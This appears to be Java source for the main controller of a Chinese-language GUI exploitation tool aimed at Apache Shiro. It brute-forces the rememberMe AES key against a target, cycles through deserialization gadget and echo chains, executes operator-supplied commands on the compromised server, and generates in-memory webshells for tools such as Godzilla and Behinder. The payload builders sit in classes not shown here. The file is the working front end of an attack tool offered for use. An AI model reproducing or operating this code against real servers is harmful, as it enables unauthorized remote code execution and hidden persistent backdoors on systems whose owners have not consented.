        this.jegServerOpt.setItems(FXCollections.observableArrayList(new String[]{"SERVER_TOMCAT", "SERVER_SPRING_MVC", "SERVER_RESIN", "SERVER_WEBLOGIC", "SERVER_JETTY", "SERVER_WEBSPHERE", "SERVER_UNDERTOW", "SERVER_GLASSFISH", "SERVER_BES", "SERVER_INFORSUITE", "SERVER_TONGWEB"}));
        this.jegServerOpt.setValue("SERVER_TOMCAT");
        this.jegModelOpt.setItems(FXCollections.observableArrayList(new String[]{"MODEL_CMD", "MODEL_CODE"}));
        this.jegModelOpt.setValue("MODEL_CMD");
        this.jegFormatOpt.setItems(FXCollections.observableArrayList(new String[]{"FORMAT_BASE64", "FORMAT_BCEL", "FORMAT_BIGINTEGER", "FORMAT_CLASS", "FORMAT_JAR", "FORMAT_JS"}));
        this.jegFormatOpt.setValue("FORMAT_BASE64");
        this.jegModelOpt.valueProperty().addListener((obs, oldVal, newVal) -> this.syncJegModelInputVisibility());
        this.syncJegModelInputVisibility();

        this.jmgToolOpt.setItems(FXCollections.observableArrayList(new String[]{"TOOL_ANTSWORD", "TOOL_BEHINDER", "TOOL_GODZILLA", "TOOL_NEOREG", "TOOL_SUO5", "TOOL_CUSTOM"}));
        this.jmgToolOpt.setValue("TOOL_GODZILLA");
        this.jmgServerOpt.setItems(FXCollections.observableArrayList(new String[]{"SERVER_TOMCAT", "SERVER_SPRING_MVC", "SERVER_RESIN", "SERVER_WEBLOGIC", "SERVER_JETTY", "SERVER_WEBSPHERE", "SERVER_UNDERTOW", "SERVER_GLASSFISH", "SERVER_APUSIC", "SERVER_BES", "SERVER_INFORSUITE", "SERVER_TONGWEB"}));
        this.jmgServerOpt.setValue("SERVER_TOMCAT");
        this.jmgShellOpt.setItems(FXCollections.observableArrayList(new String[]{"SHELL_LISTENER", "SHELL_FILTER", "SHELL_INTERCEPTOR", "SHELL_HANDLERMETHOD", "SHELL_TOMCATVALVE"}));
        this.jmgShellOpt.setValue("SHELL_LISTENER");
        this.jmgFormatOpt.setItems(FXCollections.observableArrayList(new String[]{"FORMAT_BASE64", "FORMAT_BCEL", "FORMAT_BIGINTEGER", "FORMAT_CLASS", "FORMAT_JAR", "FORMAT_JAR_AGENT", "FORMAT_JS", "FORMAT_JSP"}));
        this.jmgFormatOpt.setValue("FORMAT_BASE64");
        this.jmgGadgetOpt.setItems(FXCollections.observableArrayList(new String[]{"GADGET_NONE"}));
        this.jmgGadgetOpt.setValue("GADGET_NONE");
        this.jmgServerOpt.valueProperty().addListener((obs, oldVal, newVal) -> this.adjustJmgShellForServer(newVal));
        this.adjustJmgShellForServer(this.jmgServerOpt.getValue());

        this.changeKeyVariantOpt.setItems(FXCollections.observableArrayList(
                "filterConfigs -> shiroFilterFactoryBean",
                "getFilterRegistration -> shiroFilterFactoryBean",
                "filterConfigs -> 常见 Shiro 名依次匹配",
                "getFilterRegistration -> 常见 Shiro 名依次匹配",
                "filterConfigs -> 包含 shiro 的名称扫描",
                "高风险: 全候选 rememberMeManager 扫描"));
        this.changeKeyVariantOpt.setValue("filterConfigs -> shiroFilterFactoryBean");
        this.initChangeKeyHistoryCombo();
        this.updateKeyCrackProgress(0, 0, "Key 爆破状态：待开始");
        this.setKeyCrackButtonsDisabled(false);
        ToggleGroup langGroup = new ToggleGroup();
        this.langZhMenuItem.setToggleGroup(langGroup);
        this.langEnMenuItem.setToggleGroup(langGroup);
        this.langZhMenuItem.setSelected(true);
        this.applyLanguage();
    }


    private void applyProxyCredentialsToAuthenticator(String user, String password) {
        if (user != null && !user.trim().isEmpty()) {
            final String fu = user.trim();
            final char[] fpChars = password != null ? password.toCharArray() : new char[0];
            Authenticator.setDefault(new Authenticator() {
                @Override
                public PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(fu, fpChars);
                }
            });
        } else {
            Authenticator.setDefault(null);
        }
    }

    private void restoreSavedProxyAuthenticator() {
        Object u = currentProxy.get("username");
        Object p = currentProxy.get("password");
        this.applyProxyCredentialsToAuthenticator(
                u != null ? String.valueOf(u) : "",
                p != null ? String.valueOf(p) : "");
    }

    private void initToolbar() {
        this.proxySetupBtn.setOnAction((event) -> {
            Alert inputDialog = new Alert(AlertType.NONE);
            inputDialog.setResizable(true);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
                window.hide();
            });
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("启用");
            RadioButton disableRadio = new RadioButton("禁用");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0D);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0D);
            proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("类型：");
            ComboBox<String> typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP地址：");
            TextField IPText = new TextField();
            IPText.setText("127.0.0.1");
            Label PortLabel = new Label("端口：");
            TextField PortText = new TextField();
            PortText.setText("8080");
            Label userNameLabel = new Label("用户名：");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("密码：");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");
            saveBtn.setDefaultButton(true);
            AppLogger.info("打开代理设置窗口");
            if (currentProxy.get("proxy") != null) {
                Proxy currProxy = (Proxy)currentProxy.get("proxy");
                String proxyInfo = currProxy.address().toString();
                String[] info = proxyInfo.split(":");
                String hisIpAddress = info[0].replace("/", "");
                String hisPort = info[1];
                IPText.setText(hisIpAddress);
                PortText.setText(hisPort);
                enableRadio.setSelected(true);
                System.out.println(proxyInfo);
            } else {
                enableRadio.setSelected(false);
            }
            if (currentProxy.get("username") != null) {
                userNameText.setText(String.valueOf(currentProxy.get("username")));
            }
            if (currentProxy.get("password") != null) {
                passwordText.setText(String.valueOf(currentProxy.get("password")));
            }

            Label testUrlLabel = new Label("测试 URL：");
            TextField testUrlText = new TextField("http://www.baidu.com");
            testUrlText.setPromptText("http:// 或 https://");
            Button testProxyBtn = new Button("测试连接");
            HBox testUrlRow = new HBox(10.0D);
            testUrlRow.setAlignment(Pos.CENTER_LEFT);
            testUrlRow.getChildren().add(testUrlText);
            testUrlRow.getChildren().add(testProxyBtn);
            HBox.setHgrow(testUrlText, Priority.ALWAYS);

            testProxyBtn.setOnAction((ev) -> {
                String ipAddress = IPText.getText().trim();
                String portStr = PortText.getText().trim();
                if (ipAddress.isEmpty() || portStr.isEmpty()) {
                    (new Alert(AlertType.WARNING, "请填写 IP 与端口")).showAndWait();
                    return;
                }
                int port;
                try {
                    port = Integer.parseInt(portStr);
                } catch (NumberFormatException nfe) {
                    (new Alert(AlertType.WARNING, "端口必须是有效数字")).showAndWait();
                    return;
                }
                String typeVal = typeCombo.getValue() != null ? typeCombo.getValue().toString() : "HTTP";
                InetSocketAddress proxyAddr = new InetSocketAddress(ipAddress, port);
                Proxy testProxy;
                if ("SOCKS".equals(typeVal)) {
                    testProxy = new Proxy(Type.SOCKS, proxyAddr);
                } else {
                    testProxy = new Proxy(Type.HTTP, proxyAddr);
                }
                final String testTarget;
                String rawUrl = testUrlText.getText().trim();
                if (rawUrl.isEmpty()) {
                    testTarget = "http://www.baidu.com";
                } else {
                    testTarget = rawUrl;
                }
                testProxyBtn.setDisable(true);
                final String u = userNameText.getText();
                final String p = passwordText.getText();
                (new Thread(() -> {
                    this.applyProxyCredentialsToAuthenticator(u, p);
                    try {
                        int timeoutMs = 10000;
                        try {
                            String sec = MainController.this.httpTimeout.getText();
                            if (sec != null && !sec.trim().isEmpty()) {
                                timeoutMs = Math.max(1000, Integer.parseInt(sec.trim()) * 1000);
                            }
                        } catch (NumberFormatException ignored) {
                        }
                        String msg = HttpUtil.testProxyConnection(testProxy, testTarget, timeoutMs);
                        Platform.runLater(() -> {
                            testProxyBtn.setDisable(false);
                            Alert ok = new Alert(AlertType.INFORMATION);
                            ok.setTitle("代理测试");
                            ok.setHeaderText("连接成功");
                            ok.setContentText(msg);
                            ok.showAndWait();
                        });
                    } catch (Exception ex) {
                        String detail = ex.getMessage();
                        if (detail == null || detail.isEmpty()) {
                            detail = ex.toString();
                        }
                        String finalDetail = detail;
                        Platform.runLater(() -> {
                            testProxyBtn.setDisable(false);
                            Alert err = new Alert(AlertType.ERROR);
                            err.setTitle("代理测试");
                            err.setHeaderText("连接失败");
                            err.setContentText(finalDetail);
                            err.setResizable(true);
                            err.showAndWait();
                        });
                    } finally {
                        this.restoreSavedProxyAuthenticator();
                    }
                }, "proxy-connection-test")).start();
            });

            saveBtn.setOnAction((e) -> {
                if (disableRadio.isSelected()) {
                    currentProxy.put("proxy", (Object)null);
                    AppLogger.info("保存代理设置: enabled=false");
                    this.proxyStatusLabel.setText("");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {
                    String type;
                    String ipAddress;
                    this.applyProxyCredentialsToAuthenticator(userNameText.getText(), passwordText.getText());

                    currentProxy.put("username", userNameText.getText());
                    currentProxy.put("password", passwordText.getText());
                    ipAddress = IPText.getText();
                    String port = PortText.getText();
                    InetSocketAddress proxyAddr = new InetSocketAddress(ipAddress, Integer.parseInt(port));
                    type = ((String)typeCombo.getValue()).toString();
                    Proxy proxy;
                    if (type.equals("HTTP")) {
                        proxy = new Proxy(Type.HTTP, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    } else if (type.equals("SOCKS")) {
                        proxy = new Proxy(Type.SOCKS, proxyAddr);
                        currentProxy.put("proxy", proxy);
                    }

                    AppLogger.info("保存代理设置: enabled=true, type=" + type + ", host=" + ipAddress + ", port=" + port);
                    this.proxyStatusLabel.setText("代理生效中: " + ipAddress + ":" + port);
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }

            });
            cancelBtn.setOnAction((e) -> {
                inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            proxyGridPane.add(statusHbox, 1, 0);
            proxyGridPane.add(typeLabel, 0, 1);
            proxyGridPane.add(typeCombo, 1, 1);
            proxyGridPane.add(IPLabel, 0, 2);
            proxyGridPane.add(IPText, 1, 2);
            proxyGridPane.add(PortLabel, 0, 3);
            proxyGridPane.add(PortText, 1, 3);
            proxyGridPane.add(userNameLabel, 0, 4);
            proxyGridPane.add(userNameText, 1, 4);
            proxyGridPane.add(passwordLabel, 0, 5);
            proxyGridPane.add(passwordText, 1, 5);
            proxyGridPane.add(testUrlLabel, 0, 6);
            proxyGridPane.add(testUrlRow, 1, 6);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            proxyGridPane.add(buttonBox, 0, 7);
            inputDialog.getDialogPane().setContent(proxyGridPane);
            inputDialog.showAndWait();
        });
    }

    @FXML
    void Keytxt(ActionEvent actionEvent) {
        KeyGenerator keyGenerator = new KeyGenerator();
        String key = keyGenerator.getKey();
        this.keytxt.appendText(key);
        this.keytxt.appendText("\n");
    }

    @FXML
    void crackSpcGadgetBtn(ActionEvent event) {
        this.initAttack();
        AppLogger.info("检测当前利用链");
        String spcShiroKey = this.shiroKey.getText();
        if (spcShiroKey == null || spcShiroKey.trim().isEmpty()) {
            this.logTextArea.appendText(Utils.log("请先输入或获取可用 Shiro Key"));
            return;
        }
        String gadget = this.gadgetOpt.getValue();
        String echo = this.echoOpt.getValue();
        if (gadget == null || gadget.trim().isEmpty() || echo == null || echo.trim().isEmpty()) {
            this.logTextArea.appendText(Utils.log("请选择利用链和回显类型"));
            return;
        }
        boolean ok = this.attackService.gadgetCrack(gadget, echo, spcShiroKey.trim());
        if (!ok) {
            this.logTextArea.appendText(Utils.log("[-] 当前利用链未命中，请尝试更换组合"));
        }
    }

    @FXML
    void crackGadgetBtn(ActionEvent event) {
        this.initAttack();
        AppLogger.info("爆破利用链及回显");
        String spcShiroKey = this.shiroKey.getText();
        if (spcShiroKey == null || spcShiroKey.trim().isEmpty()) {
            spcShiroKey = AttackService.realShiroKey;
        }
        if (spcShiroKey == null || spcShiroKey.trim().isEmpty()) {
            this.logTextArea.appendText(Utils.log("请先输入或获取可用 Shiro Key"));
            return;
        }
        Task<Boolean> running = this.crackTaskRef;
        if (running != null && running.isRunning()) {
            this.logTextArea.appendText(Utils.log("利用链爆破任务正在运行中"));
            return;
        }
        final List<String> targets = this.attackService.generateGadgetEcho(this.gadgetOpt.getItems(), this.echoOpt.getItems());
        final String key = spcShiroKey.trim();
        this.crackStartMillis = System.currentTimeMillis();
        this.updateCrackProgress(0, targets.size(), "开始爆破");
        this.setCrackButtonsDisabled(true);
        Task<Boolean> task = new Task<Boolean>() {
            @Override
            protected Boolean call() {
                int total = targets.size();
                for (int i = 0; i < total; i++) {
                    if (this.isCancelled()) {
                        updateMessage("已停止");
                        updateProgress(i, total);
                        return false;
                    }
                    String pair = targets.get(i);
                    String[] parts = pair.split(":", 2);
                    String gadget = parts[0];
                    String echo = parts.length > 1 ? parts[1] : "";
                    updateMessage(gadget + " / " + echo);
                    updateProgress(i, total);
                    boolean matched = MainController.this.attackService.gadgetCrack(gadget, echo, key);
                    if (matched) {
                        updateProgress(i + 1, total);
                        updateMessage("命中: " + gadget + " / " + echo);
                        return true;
                    }
                }
                updateProgress(total, total);
                updateMessage("未找到可用组合");
                return false;
            }
        };
        task.progressProperty().addListener((obs, oldVal, newVal) -> Platform.runLater(() -> {
            int total = targets.size();
            double progress = newVal == null ? 0.0D : newVal.doubleValue();
            int current = total <= 0 ? 0 : (int) Math.round(progress * total);
            MainController.this.updateCrackProgress(Math.min(current, total), total, task.getMessage());
        }));
        task.messageProperty().addListener((obs, oldVal, newVal) -> Platform.runLater(() -> {
            double progress = task.getProgress();
            int total = targets.size();
            int current = total <= 0 || progress < 0 ? 0 : (int) Math.round(progress * total);
            MainController.this.updateCrackProgress(Math.min(current, total), total, newVal);
        }));
        task.setOnSucceeded(workerStateEvent -> {
            this.crackTaskRef = null;
            this.setCrackButtonsDisabled(false);
            boolean matched = Boolean.TRUE.equals(task.getValue());
            if (matched) {
                this.updateCrackProgress(targets.size(), targets.size(), "已找到可用组合");
            } else {
                this.updateCrackProgress(targets.size(), targets.size(), "未找到可用组合");
                this.logTextArea.appendText(Utils.log("[-] 利用链与回显全部测试完毕，未发现可用组合"));
            }
        });
        task.setOnCancelled(workerStateEvent -> {
            this.crackTaskRef = null;
            this.setCrackButtonsDisabled(false);
            this.updateCrackProgress(0, targets.size(), "已停止");
            this.logTextArea.appendText(Utils.log("[!] 已停止利用链爆破任务"));
        });
        task.setOnFailed(workerStateEvent -> {
            this.crackTaskRef = null;
            this.setCrackButtonsDisabled(false);
            Throwable ex = task.getException();
            String msg = ex != null && ex.getMessage() != null ? ex.getMessage() : "未知异常";
            this.updateCrackProgress(0, targets.size(), "执行失败");
            this.logTextArea.appendText(Utils.log("[!] 利用链爆破任务失败: " + msg));
            if (ex != null) {
                AppLogger.error("利用链爆破任务失败", ex);
            }
        });
        this.crackTaskRef = task;
        Thread worker = new Thread(task, "gadget-crack-task");
        worker.setDaemon(true);
        worker.start();
    }

    @FXML
    void cancelCrackBtn(ActionEvent event) {
        Task<Boolean> running = this.crackTaskRef;
        if (running != null && running.isRunning()) {
            AppLogger.info("停止利用链爆破任务");
            running.cancel();
        } else {
            this.updateCrackProgress(0, 0, "利用链爆破状态：待开始");
            this.setCrackButtonsDisabled(false);
        }
    }

    @FXML
    void cancelKeyCrackBtn(ActionEvent event) {
        Task<Boolean> running = this.keyCrackTaskRef;
        if (running != null && running.isRunning()) {
            AppLogger.info("停止 Key 爆破任务");
            running.cancel();
        } else {
            this.updateKeyCrackProgress(0, 0, "Key 爆破状态：待开始");
            this.setKeyCrackButtonsDisabled(false);
        }
    }

    @FXML
    void executeCmdBtn(ActionEvent event) {
        this.initAttack();
        AppLogger.info("执行命令");
        String command = this.exCommandText.getText();
        if (command == null || command.trim().isEmpty()) {
            this.execOutputArea.appendText(Utils.log("请输入命令"));
            return;
        }
        if (AttackService.gadget == null || AttackService.attackRememberMe == null || AttackService.attackRememberMe.trim().isEmpty()) {
            this.execOutputArea.appendText(Utils.log("请先完成利用链检测，或在「回显生成」中成功生成 rememberMe 载荷并同步后再执行命令"));
            return;
        }
        try {
            String output = this.attackService.execCmdTask(command.trim());
            this.execOutputArea.appendText("[command] " + command.trim() + "\n");
            if (output == null) {
                this.execOutputArea.appendText("[result] 目标无响应\n");
            } else if (output.isEmpty()) {
                this.execOutputArea.appendText("[result] 命令已执行,返回为空\n");
            } else {
                this.execOutputArea.appendText(output);
                if (!output.endsWith("\n")) {
                    this.execOutputArea.appendText("\n");
                }
            }
            this.execOutputArea.appendText("-----------------------------------------------------------------------\n");
        } catch (Exception ex) {
            String msg = ex.getMessage() != null ? ex.getMessage() : ex.toString();
            this.execOutputArea.appendText("[command] " + command.trim() + "\n");
            this.execOutputArea.appendText("[error] " + msg + "\n");
            this.execOutputArea.appendText("-----------------------------------------------------------------------\n");
            AppLogger.error("命令执行失败", ex);
        }
    }

    private void setCrackButtonsDisabled(boolean disabled) {
        if (this.crackSpcGadgetBtn != null) {
            this.crackSpcGadgetBtn.setDisable(disabled);
        }
        if (this.crackGadgetBtn != null) {
            this.crackGadgetBtn.setDisable(disabled);
        }
        if (this.cancelCrackBtn != null) {
            this.cancelCrackBtn.setDisable(!disabled);
        }
    }

    private void setKeyCrackButtonsDisabled(boolean disabled) {
        if (this.crackSpcKeyBtn != null) {
            this.crackSpcKeyBtn.setDisable(disabled);
        }
        if (this.crackKeyBtn != null) {
            this.crackKeyBtn.setDisable(disabled);
        }
        if (this.cancelKeyCrackBtn != null) {
            this.cancelKeyCrackBtn.setDisable(!disabled);
        }
    }

    private void updateKeyCrackProgress(int current, int total, String text) {
        if (this.keyCrackProgressBar != null) {
            double progress = total <= 0 ? 0.0D : Math.min(1.0D, Math.max(0.0D, (double) current / (double) total));
            this.keyCrackProgressBar.setProgress(progress);
        }
        if (this.keyCrackProgressLabel != null) {
            String elapsed = "";
            if (this.keyCrackStartMillis > 0L) {
                long seconds = Math.max(0L, (System.currentTimeMillis() - this.keyCrackStartMillis) / 1000L);
                elapsed = "（耗时 " + seconds + "s）";
            }
            if (text == null || text.trim().isEmpty()) {
                if (total > 0) {
                    this.keyCrackProgressLabel.setText("Key 进度：" + current + "/" + total + elapsed);
                } else {
                    this.keyCrackProgressLabel.setText("Key 爆破状态：待开始");
                }
            } else if (total > 0) {
                this.keyCrackProgressLabel.setText("Key 进度：" + current + "/" + total + " - " + text + elapsed);
            } else {
                this.keyCrackProgressLabel.setText(text + elapsed);
            }
        }
    }

    private void startKeyCrackTask(List<String> shiroKeys, boolean multiShiroMode) {
        if (shiroKeys == null || shiroKeys.isEmpty()) {
            this.logTextArea.appendText(Utils.log("未读取到可用于爆破的 Key 列表"));
            return;
        }
        final List<String> keys = new ArrayList<String>(shiroKeys);
        this.keyCrackStartMillis = System.currentTimeMillis();
        this.updateKeyCrackProgress(0, keys.size(), multiShiroMode ? "开始多 Shiro 场景爆破" : "开始爆破");
        this.setKeyCrackButtonsDisabled(true);
        this.logTextArea.appendText(Utils.log("[*] 开始爆破 Key，共 " + keys.size() + " 个候选"));
        if (multiShiroMode) {
            this.logTextArea.appendText(Utils.log("[*] 当前疑似多 Shiro 场景，将按 deleteMe 数量变化判断"));
        }

        Task<Boolean> task = new Task<Boolean>() {
            @Override
            protected Boolean call() {
                int total = keys.size();
                for (int i = 0; i < total; i++) {
                    if (this.isCancelled()) {
                        updateMessage("已停止");
                        updateProgress(i, total);
                        return false;
                    }
                    String shirokey = keys.get(i);
                    updateMessage(shirokey);
                    updateProgress(i, total);
                    try {
                        String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, MainController.this.attackService.shiroKeyWord, shirokey);
                        HashMap<String, String> header = new HashMap<String, String>();
                        header.put("Cookie", rememberMe);
                        String result = MainController.this.attackService.headerHttpRequest(header);
                        Thread.sleep(100L);
                        boolean matched;
                        if (multiShiroMode) {
                            matched = result != null && !result.isEmpty() && MainController.this.attackService.countDeleteMe(result) < MainController.this.attackService.flagCount;
                        } else {
                            matched = result != null && !result.isEmpty() && !result.contains("=deleteMe");
                        }
                        if (matched) {
                            AttackService.realShiroKey = shirokey;
                            final String foundKey = shirokey;
                            Platform.runLater(() -> {
                                MainController.this.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
                                MainController.this.shiroKey.setText(foundKey);
                            });
                            updateProgress(i + 1, total);
                            updateMessage("命中: " + shirokey);
                            return true;
                        }
                        final String failKey = shirokey;
                        Platform.runLater(() -> MainController.this.logTextArea.appendText(Utils.log("[-] " + failKey)));
                    } catch (Exception ex) {
                        final String failKey = shirokey;
                        final String errMsg = ex.getMessage();
                        Platform.runLater(() -> MainController.this.logTextArea.appendText(Utils.log("[-] " + failKey + " " + errMsg)));
                    }
                }
                updateProgress(total, total);
                updateMessage("未找到可用 Key");
                return false;
            }
        };

        task.progressProperty().addListener((obs, oldVal, newVal) -> Platform.runLater(() -> {
            int total = keys.size();
            double progress = newVal == null ? 0.0D : newVal.doubleValue();
            int current = total <= 0 ? 0 : (int) Math.round(progress * total);
            MainController.this.updateKeyCrackProgress(Math.min(current, total), total, task.getMessage());
        }));
        task.messageProperty().addListener((obs, oldVal, newVal) -> Platform.runLater(() -> {
            double progress = task.getProgress();
            int total = keys.size();
            int current = total <= 0 || progress < 0 ? 0 : (int) Math.round(progress * total);
            MainController.this.updateKeyCrackProgress(Math.min(current, total), total, newVal);
        }));
        task.setOnSucceeded(workerStateEvent -> {
            this.keyCrackTaskRef = null;
            this.keyCrackStartMillis = 0L;
            this.setKeyCrackButtonsDisabled(false);
            boolean matched = Boolean.TRUE.equals(task.getValue());
            if (matched) {
                this.updateKeyCrackProgress(keys.size(), keys.size(), "已找到可用 Key");
            } else {
                this.updateKeyCrackProgress(keys.size(), keys.size(), "未找到可用 Key");
                this.logTextArea.appendText(Utils.log("[-] Key 全部测试完毕，未发现可用值"));
            }
            this.logTextArea.appendText(Utils.log("[+] 爆破结束"));
        });
        task.setOnCancelled(workerStateEvent -> {
            this.keyCrackTaskRef = null;
            this.keyCrackStartMillis = 0L;
            this.setKeyCrackButtonsDisabled(false);
            this.updateKeyCrackProgress(0, keys.size(), "已停止");
            if (this.keyCrackProgressBar != null) {
                this.keyCrackProgressBar.setProgress(0.0D);
            }
            this.logTextArea.appendText(Utils.log("[!] 已停止 Key 爆破任务"));
        });
        task.setOnFailed(workerStateEvent -> {
            this.keyCrackTaskRef = null;
            this.keyCrackStartMillis = 0L;
            this.setKeyCrackButtonsDisabled(false);
            Throwable ex = task.getException();
            String msg = ex != null && ex.getMessage() != null ? ex.getMessage() : "未知异常";
            this.updateKeyCrackProgress(0, keys.size(), "执行失败");
            this.logTextArea.appendText(Utils.log("[!] Key 爆破任务失败: " + msg));
            if (ex != null) {
                AppLogger.error("Key 爆破任务失败", ex);
            }
        });
        this.keyCrackTaskRef = task;
        Thread worker = new Thread(task, "key-crack-task");
        worker.setDaemon(true);
        worker.start();
    }

    private void updateCrackProgress(int current, int total, String text) {
        if (this.crackProgressBar != null) {
            double progress = total <= 0 ? 0.0D : Math.min(1.0D, Math.max(0.0D, (double) current / (double) total));
            this.crackProgressBar.setProgress(progress);
        }
        if (this.crackProgressLabel != null) {
            String elapsed = "";
            if (this.crackStartMillis > 0L) {
                long seconds = Math.max(0L, (System.currentTimeMillis() - this.crackStartMillis) / 1000L);
                elapsed = "（耗时 " + seconds + "s）";
            }
            if (text == null || text.trim().isEmpty()) {
                if (total > 0) {
                    this.crackProgressLabel.setText("进度：" + current + "/" + total + elapsed);
                } else {
                    this.crackProgressLabel.setText("利用链爆破状态：待开始");
                }
            } else if (total > 0) {
                this.crackProgressLabel.setText("进度：" + current + "/" + total + " - " + text + elapsed);
            } else {
                this.crackProgressLabel.setText(text + elapsed);
            }
        }
    }

    private void adjustJmgShellForServer(String serverType) {
        if (this.jmgShellOpt == null || serverType == null) {
            return;
        }
        if ("SERVER_SPRING_MVC".equals(serverType)) {
            String current = this.jmgShellOpt.getValue();
            if (current == null || "SHELL_LISTENER".equals(current) || "SHELL_TOMCATVALVE".equals(current)) {
                this.jmgShellOpt.setValue("SHELL_FILTER");
            }
        }
    }

    private String buildJmgSelectionWarning(String serverType, String shellType) {
        if ("SERVER_SPRING_MVC".equals(serverType) && "SHELL_LISTENER".equals(shellType)) {
            return "当前组合为 SERVER_SPRING_MVC + SHELL_LISTENER。\n\n"
                    + "该组合在不少 jMG 版本中稳定性较差，常见现象就是 Javassist 生成阶段直接报 syntax error。\n\n"
                    + "建议改用：\n"
                    + "1）SHELL_FILTER（首选）\n"
                    + "2）SHELL_INTERCEPTOR（次选）\n\n"
                    + "本次已按你当前选择继续尝试；若失败请先切换马类型再生成。";
        }
        return null;
    }

    private String normalizeEchoSource(String source) {
        if (source == null) {
            return "Legacy";
        }
        if ("传统模式".equalsIgnoreCase(source) || "Legacy".equalsIgnoreCase(source)) {
            return "Legacy";
        }
        return source;
    }

    private String normalizeMemshellSource(String source) {
        if (source == null) {
            return "Legacy";
        }
        if ("传统模式".equalsIgnoreCase(source) || "Legacy".equalsIgnoreCase(source)) {
            return "Legacy";
        }
        return source;
    }

    private String displaySourceName(String source) {
        if (source == null || source.trim().isEmpty()) {
            return "传统模式";
        }
        if ("Legacy".equalsIgnoreCase(source) || "传统模式".equalsIgnoreCase(source)) {
            return "传统模式";
        }
        return source;
    }

    /**
     * 将「回显生成」或「Shiro 利用」得到的载荷与构造链写入 {@link AttackService} 静态上下文。
     * jEG 可能只输出密文，经 {@link AttackService#resolveRememberMeCookieLine} 规范为 {@code rememberMe=} 后与 Legacy 共用命令执行路径。
     */
    private void syncAttackServiceForEchoExploit(String rememberMeOrRawPayload, String jegHeaderNameHint, String gadgetName) {
        String line = AttackService.resolveRememberMeCookieLine(rememberMeOrRawPayload, jegHeaderNameHint);
        if (line != null) {
            AttackService.attackRememberMe = line;
        }
        if (gadgetName != null && !gadgetName.trim().isEmpty()) {
            AttackService.gadget = gadgetName.trim();
        }
    }

    private String buildEchoFailureGuidance(EchoGenerateResult result) {
        String src = result != null && result.getSource() != null ? result.getSource() : "";
        String msg = result != null && result.getMessage() != null ? result.getMessage() : "(无详情)";
        StringBuilder sb = new StringBuilder();
        sb.append("服务端返回/内部信息：").append(msg).append("\n\n");
        if ("Legacy".equalsIgnoreCase(src)) {
            sb.append("常见原因：\n");
            sb.append("· Shiro Key 不正确或未与目标一致；\n");
            sb.append("· 所选利用链、回显与目标 classpath（如 commons-beanutils 版本）不匹配；\n");
            sb.append("· 非 JDK 8 运行导致序列化/Gadget 行为与预期不一致。\n\n");
            sb.append("建议操作：\n");
            sb.append("1）在「指定Key」填写正确 Base64 Key，或先「爆破密钥」成功后再生成；\n");
            sb.append("2）「来源」保持 传统模式（默认），多换几组「利用链 + 回显」；\n");
            sb.append("3）使用 JDK 8（含 JavaFX）启动本工具后重试。\n");
        } else {
            sb.append("常见原因：jEG 依赖未就绪、选项与目标容器不符（如 Spring 须选正确 Server 常量）。\n\n");
            sb.append("建议操作：\n");
            sb.append("1）将「来源」改为 传统模式 使用内置链；\n");
            sb.append("2）按项目文档安装 jEG-core；\n");
            sb.append("3）核对 jEG 的 Server/Model 与目标环境。\n");
        }
        return sb.toString();
    }

    private String buildMemshellFailureGuidance(MemshellGenerateResult result) {
        String src = result != null && result.getSource() != null ? result.getSource() : "";
        String msg = result != null && result.getMessage() != null ? result.getMessage() : "(无详情)";
        StringBuilder sb = new StringBuilder();
        sb.append("服务端返回/内部信息：").append(msg).append("\n\n");
        if ("Legacy".equalsIgnoreCase(src)) {
            sb.append("常见原因：所选内存马类型无对应模板，或本地依赖异常。\n\n");
            sb.append("建议：在「内存马注入」页确认类型存在，或检查 lib/ 与 MemBytes 配置。\n");
        } else {
            sb.append("常见原因：jMG 依赖未安装、Tool/Server/Shell 选项与目标不符。\n\n");
            sb.append("建议：将「来源」改为 传统模式；或按文档安装 jmg-sdk 并调整各下拉项。\n");
        }
        return sb.toString();
    }

    @FXML
    void genEchoBtn(ActionEvent actionEvent) {
        if (this.attackService == null) {
            this.initAttack();
        }
        String source = this.echoSourceOpt.getValue();
        AppLogger.info("回显生成: source=" + source + ", server=" + this.jegServerOpt.getValue() + ", model=" + this.jegModelOpt.getValue() + ", format=" + this.jegFormatOpt.getValue());
        if (source == null || source.trim().isEmpty()) {
            source = "传统模式";
            this.echoSourceOpt.setValue("传统模式");
        }
        source = this.normalizeEchoSource(source);
        String key = this.shiroKey.getText();
        if (key == null || key.trim().isEmpty()) {
            key = AttackService.realShiroKey;
        }
        if (key == null || key.trim().isEmpty()) {
            if (!"jEG".equalsIgnoreCase(source)) {
                this.echoGeneratorOutput.appendText("[传统模式/jEG 回显] 需要 Shiro Key：请在「指定Key」填写 Base64 key，或先爆破成功后再生成。\n");
                this.echoGeneratorOutput.appendText("-------------------------------------------------\n");
                this.showGuidanceAlert(
                        AlertType.WARNING,
                        "缺少 Shiro Key",
                        "无法构造 rememberMe 载荷",
                        "原因：Echo 生成必须用 AES Key（Base64）加密序列化数据。\n\n"
                                + "请：\n"
                                + "1）在「指定Key」中粘贴正确 Key；或\n"
                                + "2）先对目标「爆破密钥」，成功后会自动填入可用 Key。\n\n"
                                + "完成后再点「生成/回退生成」。");
                return;
            }
